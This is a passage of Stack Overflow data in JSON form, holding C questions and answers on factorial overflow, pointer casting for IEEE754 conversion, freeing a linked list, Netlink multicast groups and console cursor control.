"comment_id": 59447853, "body": "Just print it ! And google is your friend."}, {"owner": {"reputation": 3483, "user_id": 3932569, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1bca364f93a9dfab17419b31a8a1a504?s=128&d=identicon&r=PG&f=1", "display_name": "Garf365", "link": "https://stackoverflow.com/users/3932569/garf365"}, "edited": false, "score": 0, "creation_date": 1457531985, "post_id": 35893305, "comment_id": 59447986, "body": "@banana1337 <code>ULONG_MAX</code> is a macro which contains maximum value which can be stored inside an <code>unsigned long</code>."}, {"owner": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "reply_to_user": {"reputation": 3483, "user_id": 3932569, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1bca364f93a9dfab17419b31a8a1a504?s=128&d=identicon&r=PG&f=1", "display_name": "Garf365", "link": "https://stackoverflow.com/users/3932569/garf365"}, "edited": false, "score": 0, "creation_date": 1457532274, "post_id": 35893305, "comment_id": 59448207, "body": "@Garf365 What do you mean? I thought that <code>unsigned long long</code> can store more values than an <code>unsigned long</code>."}, {"owner": {"reputation": 7481, "user_id": 2527795, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/8359590ce3a66e5c58407ae5c83c9bbe?s=128&d=identicon&r=PG&f=1", "display_name": "vll", "link": "https://stackoverflow.com/users/2527795/vll"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 1, "creation_date": 1457532722, "post_id": 35893305, "comment_id": 59448541, "body": "@CoolGuy <code>long long</code> doesn&#39;t have to be longer than 64 bits. On OP&#39;s computer, <code>long</code> is 64 bits already. <code>int</code>, on the other hand, should not be longer than 32 bits on any system."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1457533722, "post_id": 35893305, "comment_id": 59449264, "body": "In the duplicate question the OP was calculating terms for a Taylor series. The answer from @nickie pointed out that you don&#39;t even need to compute a factorial, since each term can be calculated from the previous term with a multiplication and division."}, {"owner": {"reputation": 3483, "user_id": 3932569, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1bca364f93a9dfab17419b31a8a1a504?s=128&d=identicon&r=PG&f=1", "display_name": "Garf365", "link": "https://stackoverflow.com/users/3932569/garf365"}, "reply_to_user": {"reputation": 19358, "user_id": 3049655, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/ZLzeP.jpg?s=128&g=1", "display_name": "Spikatrix", "link": "https://stackoverflow.com/users/3049655/spikatrix"}, "edited": false, "score": 3, "creation_date": 1457533855, "post_id": 35893305, "comment_id": 59449349, "body": "@CoolGuy in fact, it&#39;s not totally true : <code>unsigned long</code> should be <i>at least</i> 32bits, <code>unsigned long long</code> should be <i>at least</i> 64 bits, and <code>sizeof(unsigned long long) &gt;= sizeof(unsigned long)</code>. So it&#39;s not impossible that <code>unsigned long long</code> and <code>unsigned long</code> have same size and so store same values"}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 1, "creation_date": 1457533940, "post_id": 35893305, "comment_id": 59449404, "body": "The numerical limits of the various integer types are among the very first things discussed when learning any programming language. Typically this is discussed in chapter 1 or 2 of any beginner-level programming book for any programming language."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 7481, "user_id": 2527795, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/8359590ce3a66e5c58407ae5c83c9bbe?s=128&d=identicon&r=PG&f=1", "display_name": "vll", "link": "https://stackoverflow.com/users/2527795/vll"}, "edited": false, "score": 1, "creation_date": 1457534165, "post_id": 35893305, "comment_id": 59449556, "body": "@Ville-ValtteriTiittanen: There is no restriction on the width of any integer type. <code>int</code> can very well have 1024 bits."}], "answers": [{"tags": [], "owner": {"reputation": 8959, "user_id": 1182921, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/5cbca9fe5b06dab4005212a4bf9a5416?s=128&d=identicon&r=PG", "display_name": "Tom Tanner", "link": "https://stackoverflow.com/users/1182921/tom-tanner"}, "is_accepted": false, "score": 0, "last_activity_date": 1457531629, "creation_date": 1457531629, "answer_id": 35893562, "question_id": 35893305, "link": "https://stackoverflow.com/questions/35893305/factorial-program-in-c-is-wrong-after-20/35893562#35893562", "title": "Factorial program in C is wrong after 20", "body": "<p>The number comes from overflow. Unsigned arithmetic is done modulo (max value of that type), so a little maths should explain why you get the result you do.</p>\n\n<p>The result of signed integer overflow is undefined so you could have got anything if you'd been using signed integers (though the chances are it'd have been exactly the same on a lot of systems)</p>\n"}, {"tags": [], "owner": {"reputation": 56328, "user_id": 4265352, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-lzAUc5pYb24/AAAAAAAAAAI/AAAAAAAAAGQ/q3h7bZUnqrs/photo.jpg?sz=128", "display_name": "axiac", "link": "https://stackoverflow.com/users/4265352/axiac"}, "is_accepted": true, "score": 4, "last_activity_date": 1457537673, "last_edit_date": 1457537673, "creation_date": 1457532259, "answer_id": 35893785, "question_id": 35893305, "link": "https://stackoverflow.com/questions/35893305/factorial-program-in-c-is-wrong-after-20/35893785#35893785", "title": "Factorial program in C is wrong after 20", "body": "<p>This answers only to half of your question (why it works this way).</p>\n\n<p>The result you get is <a href=\"http://www.wolframalpha.com/input/?i=21!+mod+%282%5E64-1%29\" rel=\"nofollow\"><code>21! mod 2^64</code></a>. This is because you are using a 64-bit system and <code>21!</code> is greater than the greatest number that can be stored as unsigned integer on 64 bits.</p>\n\n<p>All factorials you compute for values greater than or equal to <code>21</code> are wrong; they cannot be represented on 64-bit integers because they are longer than that.</p>\n\n<p>You can try to use <code>unsigned long long</code> as the type of the values returned by function <code>fact()</code> (and change into the <code>printf()</code> format string <code>%lu</code> with <code>%llu</code>); it could help but it depends on some factors. It doesn't help on my architecture, for example.</p>\n\n<p>You can find out if it can help you by checking the value returned by <code>sizeof(unsigned long long)</code>. If if is <code>8</code> then you are out of luck. <code>20</code> is the largest number for what you can compute factorial on that system.</p>\n\n<hr>\n\n<p>If your purpose is to compute factorials then you have to use a library that knows how to handle large numbers. However, if you need factorials for other computations (for example, for <a href=\"https://en.wikipedia.org/wiki/Combination\" rel=\"nofollow\">combinations</a>) then you can try to avoid generating large numbers and find a way to match each multiplication with a division. This way the magnitude of the numbers you use is between the limits of 64-bit integers and you can go further than <code>21</code>.</p>\n\n<p>Or you can use <code>double</code> instead of integers and you are again back in business but with loss of precision. Large floating point numbers store correctly the magnitude of the number and its first digits. The last digits are lost.</p>\n\n<p>I didn't program very much in C/C++ recently, I cannot recommend you a library that can help you do computations with large numbers :-(</p>\n"}], "owner": {"reputation": 25, "user_id": 6020038, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c58b0b30c22c24ab532ee3fe43777982?s=128&d=identicon&r=PG&f=1", "display_name": "banana1337", "link": "https://stackoverflow.com/users/6020038/banana1337"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2034, "favorite_count": 0, "closed_date": 1457532483, "accepted_answer_id": 35893785, "answer_count": 2, "score": 0, "last_activity_date": 1457537673, "creation_date": 1457531014, "question_id": 35893305, "link": "https://stackoverflow.com/questions/35893305/factorial-program-in-c-is-wrong-after-20", "closed_reason": "Duplicate", "title": "Factorial program in C is wrong after 20", "body": "<p>It works up until 20 but if 21 is entered it returns 1419745... when 21 factorial is actually 51090942171709440000. I'm assuming that this is because of the unsigned long maxing out but where does this wrong number (141...) come from and how can I allow the program to work out the factorial of larger numbers?</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nunsigned long fact(unsigned long input);\n\nint main()\n\n{\n\n    int input;\n\n    printf(\"Enter an integer to find the factorial of: \");\n    scanf(\" %d\", &amp;input);\n\n    printf(\"The Factorial of %d = %lu\\n\" , input, fact(input)); \n\n    return 0;\n}\n\nunsigned long fact(unsigned long input)\n{\n    if (input == 0)\n            return 1;\n    else    \n        return input * fact(input - 1);\n}\n</code></pre>\n"}, {"tags": ["c", "pointers", "casting", "arduino"], "comments": [{"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1457530214, "post_id": 35892766, "comment_id": 59446710, "body": "The third line <code>byte* array = (byte*) &amp;ieee754_value;</code> is casting the values at the memory address occupied by <code>ieee754_value</code> to type <code>(byte*)</code> and assigning the address to <code>array</code> (which will have been declared somewhere earlier as unsigned-char or typedefed). This allows indexing of the 4-bytes in <code>ieee754_value</code> which are then written to <code>ieee754_str</code> via <code>sprintf</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457531231, "post_id": 35892766, "comment_id": 59447474, "body": "<code>byte</code> is no standard type. Why not use <code>unsigned char *</code>?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1457531367, "post_id": 35892766, "comment_id": 59447549, "body": "@DavidC.Rankin: &quot;... is casting the values at the memory address occupied by ...&quot; \u2013 No. It casts the address of the <code>float</code> to a <code>byte *</code>, not the value."}, {"owner": {"reputation": 18827, "user_id": 1413133, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hqUmk.jpg?s=128&g=1", "display_name": "Manos Nikolaidis", "link": "https://stackoverflow.com/users/1413133/manos-nikolaidis"}, "edited": false, "score": 0, "creation_date": 1457531539, "post_id": 35892766, "comment_id": 59447668, "body": "Do you mean the 3rd line in your code or in the function ?"}, {"owner": {"reputation": 814, "user_id": 3718280, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/8cb9d5a090944a9e61dc55d56401c176?s=128&d=identicon&r=PG&f=1", "display_name": "vxs8122", "link": "https://stackoverflow.com/users/3718280/vxs8122"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457532550, "post_id": 35892766, "comment_id": 59448413, "body": "@Olaf byte was used I thought that&#39;s one of the standard types for Arduino: <a href=\"https://www.arduino.cc/en/Reference/Byte\" rel=\"nofollow noreferrer\">arduino.cc/en/Reference/Byte</a>"}, {"owner": {"reputation": 814, "user_id": 3718280, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/8cb9d5a090944a9e61dc55d56401c176?s=128&d=identicon&r=PG&f=1", "display_name": "vxs8122", "link": "https://stackoverflow.com/users/3718280/vxs8122"}, "reply_to_user": {"reputation": 18827, "user_id": 1413133, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hqUmk.jpg?s=128&g=1", "display_name": "Manos Nikolaidis", "link": "https://stackoverflow.com/users/1413133/manos-nikolaidis"}, "edited": false, "score": 0, "creation_date": 1457532670, "post_id": 35892766, "comment_id": 59448514, "body": "@ManosNikolaidis 3rd line in my code."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1457532768, "post_id": 35892766, "comment_id": 59448572, "body": "@Olaf thank you, that is what I meant, but it is still before the 2nd cup of coffee here <code>:(</code>"}], "answers": [{"tags": [], "owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "is_accepted": true, "score": 2, "last_activity_date": 1457531948, "creation_date": 1457531948, "answer_id": 35893671, "question_id": 35892766, "link": "https://stackoverflow.com/questions/35892766/what-does-the-cast-pointer-do-in-this-code/35893671#35893671", "title": "What does the cast pointer do in this code?", "body": "<p>This cast:</p>\n\n<pre><code>byte* array = (byte*) &amp;ieee754_value;\n</code></pre>\n\n<p>converts the value <code>&amp;ieee754_value</code> to the type <code>byte *</code>, so that it can be assigned to the variable <code>array</code>. Without the cast the expression <code>&amp;ieee754_value</code> has type <code>float *</code> and such a value cannot be assigned to a variable of type <code>byte *</code>. Thus the cast is necessary.</p>\n\n<p>The <code>array</code> pointer is then used to read the bytes making up the value.</p>\n\n<p>This is not a recommended technique, it's better to use a <code>union</code> for this:</p>\n\n<pre><code>union {\n  float ieee754_value;\n  byte  bytes[4];\n} tmp = { .ieee754_value = (float) value / 1000 };\n</code></pre>\n\n<p>then access the bytes through <code>tmp.bytes</code>.</p>\n"}], "owner": {"reputation": 814, "user_id": 3718280, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/8cb9d5a090944a9e61dc55d56401c176?s=128&d=identicon&r=PG&f=1", "display_name": "vxs8122", "link": "https://stackoverflow.com/users/3718280/vxs8122"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 50, "favorite_count": 0, "accepted_answer_id": 35893671, "answer_count": 1, "score": 1, "last_activity_date": 1457531948, "creation_date": 1457529641, "last_edit_date": 1457529979, "question_id": 35892766, "link": "https://stackoverflow.com/questions/35892766/what-does-the-cast-pointer-do-in-this-code", "title": "What does the cast pointer do in this code?", "body": "<p>This function is supposed to convert an integer value to 32-bit float representation in hex.  But I don't understand what the 3rd line actually does.  Can anyone elaborate on that? </p>\n\n<pre><code>void convert_to_IEEE754( int value, char* ieee754_str ) {\n  float ieee754_value = (float) value / 1000;  // value is pre-multiplied by 1000\n  byte* array = (byte*) &amp;ieee754_value;\n  sprintf( ieee754_str, \"%02x%02x%02x%02x\", array[3], array[2], array[1], array[0] );\n}\n</code></pre>\n"}, {"tags": ["c", "loops", "pointers", "free"], "comments": [{"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 3, "creation_date": 1457529458, "post_id": 35892675, "comment_id": 59446163, "body": "No. It&#39;s undefined behavior, and not guaranteed to work."}, {"owner": {"reputation": 481, "user_id": 5916150, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c209005186a84dd1820b220d7b78527e?s=128&d=identicon&r=PG&f=1", "display_name": "Arif Burhan", "link": "https://stackoverflow.com/users/5916150/arif-burhan"}, "edited": false, "score": 0, "creation_date": 1457529855, "post_id": 35892675, "comment_id": 59446435, "body": "How are you obtaining the head of the list ?   The thing I learned when working with linked lists is that a list with N nodes has N-1 links.  Obvious when you know, mysterious, and often fatal when you don&#39;t.  Add a print statement into the body of all three loops, and physically count nodes and links."}], "answers": [{"comments": [{"owner": {"reputation": 51244, "user_id": 952747, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/86ebf3cf751f63acb38e763f7104a318?s=128&d=identicon&r=PG&f=1", "display_name": "masoud", "link": "https://stackoverflow.com/users/952747/masoud"}, "edited": false, "score": 0, "creation_date": 1457529976, "post_id": 35892774, "comment_id": 59446538, "body": "Using <code>for</code> is nice most of the time."}], "tags": [], "owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "is_accepted": false, "score": 3, "last_activity_date": 1457529651, "creation_date": 1457529651, "answer_id": 35892774, "question_id": 35892675, "link": "https://stackoverflow.com/questions/35892675/c-do-while-free-a-linked-list/35892774#35892774", "title": "C: do-while free a linked list", "body": "<p>Your first version is not correct, it's undefined behavior to rely on the content of memory after calling <code>free()</code> on it. It might happen to work, but that's just undefined behavior happening to do something that seems well-defined. It really isn't.</p>\n\n<p>You can of course just use the proper looping construct, and have a better life:</p>\n\n<pre><code>for (params_t *next; params != NULL; params = next)\n{\n  next = params-&gt;next;\n  free(params);\n}\n</code></pre>\n\n<p>This seems like a better match than the other alternatives, since you can use the various clauses of the <code>for</code> construct usefully. It's still a two-liner, but there's such a thing as too terse code too. :)</p>\n"}, {"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": false, "score": 2, "last_activity_date": 1457530027, "last_edit_date": 1457530027, "creation_date": 1457529682, "answer_id": 35892784, "question_id": 35892675, "link": "https://stackoverflow.com/questions/35892675/c-do-while-free-a-linked-list/35892784#35892784", "title": "C: do-while free a linked list", "body": "<p>This code snippet</p>\n\n<pre><code>  do {\n    free(params);\n  } while ((params = params-&gt;next));\n</code></pre>\n\n<p>has undefined behaviour because there is an attempt to access an object that is not alive.</p>\n\n<p>This code snippet</p>\n\n<pre><code>  do {\n    params_t *next = params-&gt;next;\n    free(params);\n    params = next;\n  } while (params);\n</code></pre>\n\n<p>is also wrong (provided that there is no check that params is equal to NULL before the loop) because in general <code>params</code> initially can be equal to NULL. The same problem exists for the first code snippet.</p>\n\n<p>Only this code snippet</p>\n\n<pre><code>  while (params) {\n    params_t *next = params-&gt;next;\n    free(params);\n    params = next;\n  }\n</code></pre>\n\n<p>is valid.:)</p>\n"}], "owner": {"reputation": 405, "user_id": 2913372, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/b36f02d1405950501d2a3fdb00e7f760?s=128&d=identicon&r=PG&f=1", "display_name": "amq", "link": "https://stackoverflow.com/users/2913372/amq"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 57, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1457530027, "creation_date": 1457529400, "last_edit_date": 1457529891, "question_id": 35892675, "link": "https://stackoverflow.com/questions/35892675/c-do-while-free-a-linked-list", "title": "C: do-while free a linked list", "body": "<p>I have noticed that this works properly, but I wouldn't expect it to:</p>\n\n<pre><code>  do {\n    free(params);\n  } while ((params = params-&gt;next));\n</code></pre>\n\n<p>Normally I would use something like this, but doesn't look as elegant:</p>\n\n<pre><code>  do {\n    params_t *next = params-&gt;next;\n    free(params);\n    params = next;\n  } while (params);\n</code></pre>\n\n<p>(the code implies that <code>params</code> is allocated)</p>\n\n<p>Or:</p>\n\n<pre><code>  while (params) {\n    params_t *next = params-&gt;next;\n    free(params);\n    params = next;\n  }\n</code></pre>\n\n<p>Probably unrelated, but I am using <code>-std=gnu11</code> with <code>clang</code>.</p>\n\n<p>Is the first piece of code valid?</p>\n"}, {"tags": ["c", "linux", "kernel", "netlink"], "comments": [{"owner": {"reputation": 1207, "user_id": 1641854, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/79e6b5b23adf85e9a616af4cf4690cce?s=128&d=identicon&r=PG", "display_name": "user1641854", "link": "https://stackoverflow.com/users/1641854/user1641854"}, "edited": false, "score": 0, "creation_date": 1457530227, "post_id": 35892666, "comment_id": 59446717, "body": "My impression is that it was intentional not to publish or gather any information regarding netlink. The &quot;right&quot; way is to use libnl. I was only able to find all information I need from reading kernel sources :("}], "answers": [{"tags": [], "owner": {"reputation": 820, "user_id": 1735458, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/45ad4e19f178f150d44ef1e74189daa7?s=128&d=identicon&r=PG", "display_name": "Yd Ahhrk", "link": "https://stackoverflow.com/users/1735458/yd-ahhrk"}, "is_accepted": false, "score": 0, "last_activity_date": 1457806052, "last_edit_date": 1495541271, "creation_date": 1457805644, "answer_id": 35961340, "question_id": 35892666, "link": "https://stackoverflow.com/questions/35892666/what-multicast-groups-are-available-for-each-netlink-family/35961340#35961340", "title": "What multicast groups are available for each netlink family?", "body": "<p>Well, this is not much of an answer, but I believe it's the closest it can practically be.</p>\n\n<p>Netlink doesn't store any group metadata AFAIK. Users of the protocol define their groups and what they want to do with them by hacking the <code>nl_groups</code> bitfield. So you're not asking about Netlink; you're asking about Netlink's <em>users</em>. Furthermore, I've heard (though not actually bothered to implement) that even userspace can send multicast messages to arbitrary groups, even to other userspace clients, so the question is also not really kernel-scoped.</p>\n\n<p>I'd be really surprised if there were a list lying around somewhere collecting this information for you. Netlink users are not meant to be static;  One kernel will have a <a href=\"http://lxr.free-electrons.com/source/include/linux/netlink.h?v=2.2.26#L4\" rel=\"nofollow noreferrer\">bunch of users</a>, another kernel will have <a href=\"http://lxr.free-electrons.com/source/include/uapi/linux/netlink.h?v=4.3#L8\" rel=\"nofollow noreferrer\">another bunch of users</a>. Each user protocol will define its own multicast groups (if any). And that's not even counting protocols defined by stray out-of-tree kernel modules that don't have the common sense to use <a href=\"https://stackoverflow.com/questions/32898173\">Generic Netlink instead of Netlink</a>. :)</p>\n\n<p>If you're hard pressed to find the <em>fragment</em> of this information which is readily available, you would have to notice from the Netlink socket API that kernel-side users of Netlink <a href=\"http://lxr.free-electrons.com/source/net/netlink/af_netlink.c?v=4.3#L2576\" rel=\"nofollow noreferrer\">initialize <code>nl_groups</code></a> via a <a href=\"http://lxr.free-electrons.com/source/include/linux/netlink.h?v=4.3#L28\" rel=\"nofollow noreferrer\">control buffer field named <code>dst_group</code></a>. So you'd have to find code that initializes this field. <code>NETLINK_DNRTMSG</code>, for example, seems to have <a href=\"http://lxr.free-electrons.com/source/net/decnet/netfilter/dn_rtmsg.c?v=4.3#L64\" rel=\"nofollow noreferrer\">two groups</a>... one called <code>DNRNG_NLGRP_L1</code>, and another one called <code>DNRNG_NLGRP_L2</code>... good luck figuring out what they are. :)</p>\n\n<p>On the other hand, and as you've seen, userspace code interacts with the groups via <code>nl_groups</code>. You'd have to find code that initializes this field. Since userspace code is even more scattered than the kernel's, you're facing a bit of an unreasonable task.</p>\n\n<p>In other words, I feel your approach (for whatever it is that you're doing) is not exactly in line with Netlink's design. You don't <em>list</em> the multicast groups; your code already knows what they are for the specific protocol it's implementing and so it subscribes itself to it statically.</p>\n"}], "owner": {"reputation": 11, "user_id": 6039505, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/14a88ef1f3390e02422086a06583a6a4?s=128&d=identicon&r=PG&f=1", "display_name": "Zajcev", "link": "https://stackoverflow.com/users/6039505/zajcev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 865, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1457806052, "creation_date": 1457529380, "last_edit_date": 1457535470, "question_id": 35892666, "link": "https://stackoverflow.com/questions/35892666/what-multicast-groups-are-available-for-each-netlink-family", "title": "What multicast groups are available for each netlink family?", "body": "<p>The netlink socket address structure is shown in the following</p>\n\n<pre><code>struct sockaddr_nl {\n    sa_family_t     nl_family;  /* AF_NETLINK */\n    unsigned short  nl_pad;     /* Zero. */\n    pid_t           nl_pid;     /* Port ID. */\n    __u32           nl_groups;  /* Multicast groups mask. */\n};\n</code></pre>\n\n<p>man 7 netlink says, that each netlink family has a set of 32 multicast groups.\nWhere do I find available multicast groups for each netlink family ? I am not able to find them on the man page.</p>\n"}, {"tags": ["c", "multithreading", "multitasking"], "comments": [{"owner": {"reputation": 96, "user_id": 1182907, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1b8c06ab9870e783d094d7b03737fa9e?s=128&d=identicon&r=PG", "display_name": "Loomchild", "link": "https://stackoverflow.com/users/1182907/loomchild"}, "edited": false, "score": 0, "creation_date": 1457532496, "post_id": 35892647, "comment_id": 59448374, "body": "I&#39;m not sure I get it. Do you want the blinking text cursor to move to your mouse cursor when you click ? If that&#39;s so, I don&#39;t see the point of monitoring the keyboard input for the Enter key... What you need to do is a Windows event callback to catch the mouseClick event on your window and you certainly don&#39;t need any multithreading for this."}, {"owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "edited": false, "score": 0, "creation_date": 1457535191, "post_id": 35892647, "comment_id": 59450412, "body": "Looks like Microsoft Windows. In general, you might not have windows or a mouse (e.g. when connected to a Linux server via SSH)."}], "answers": [{"tags": [], "owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "is_accepted": false, "score": 0, "last_activity_date": 1457535460, "creation_date": 1457535460, "answer_id": 35895050, "question_id": 35892647, "link": "https://stackoverflow.com/questions/35892647/how-to-move-the-cursor-to-mouse-position-while-inputting-value-in-c/35895050#35895050", "title": "How to move the cursor to mouse position while inputting value in C?", "body": "<p>(Assuming Microsoft Windows)</p>\n\n<p>You'll have to read the mouse events via <a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms685035(v=vs.85).aspx\" rel=\"nofollow\"><code>ReadConsoleInput()</code></a> and then set the cursor position via <code>SetConsoleCursorPosition</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 6318647, "user_type": "registered", "profile_image": "https://graph.facebook.com/782451461891849/picture?type=large", "display_name": "copj", "link": "https://stackoverflow.com/users/6318647/copj"}, "is_accepted": false, "score": 0, "last_activity_date": 1462948662, "creation_date": 1462948662, "answer_id": 37154799, "question_id": 35892647, "link": "https://stackoverflow.com/questions/35892647/how-to-move-the-cursor-to-mouse-position-while-inputting-value-in-c/37154799#37154799", "title": "How to move the cursor to mouse position while inputting value in C?", "body": "<p>In turbo c I used to use interrupt routine by defining x86 interrupts. you can try using that.</p>\n\n<p>It can give you input for any interrupts, including mouse on press and on release, and location of where the mouse presently is. But you have to first understand x86 interrupts in C to use them.</p>\n\n<p>Sorry don't have an example with me right now.</p>\n\n<p>Suggestion: Also if you want to imitate a text editor, you should also allow movement through arrows and when you use a=getche() it'll print and also give u input in a and you then are using printf(\"%c\") without any var, it's actually not required.</p>\n"}], "owner": {"reputation": 1525, "user_id": 5986816, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/oGWoQ.jpg?s=128&g=1", "display_name": "Ahmad Taha", "link": "https://stackoverflow.com/users/5986816/ahmad-taha"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 421, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1462948662, "creation_date": 1457529340, "last_edit_date": 1457537924, "question_id": 35892647, "link": "https://stackoverflow.com/questions/35892647/how-to-move-the-cursor-to-mouse-position-while-inputting-value-in-c", "title": "How to move the cursor to mouse position while inputting value in C?", "body": "<p><strong>Windows:</strong>  I am creating a program which is a type of text editor (for learning C). I want to move the cursor to <code>X and Y of the mouse click position</code>. While <code>getche()</code> is being used. I currently have the following code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include&lt;conio.h&gt;\nint main()\n{\n    char a;\n    do{\n           a=getche();\n           fflush(stdin);\n           printf(\"%c\");\n    }while(a!=13)\n}\n</code></pre>\n\n<p>where 13 is the Enter key in ASCII.</p>\n\n<p>Have a look at this image:</p>\n\n<p><a href=\"https://i.stack.imgur.com/P0wfE.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/P0wfE.png\" alt=\"Have a look at this image\"></a></p>\n\n<p><strong>Here I want that whenever I 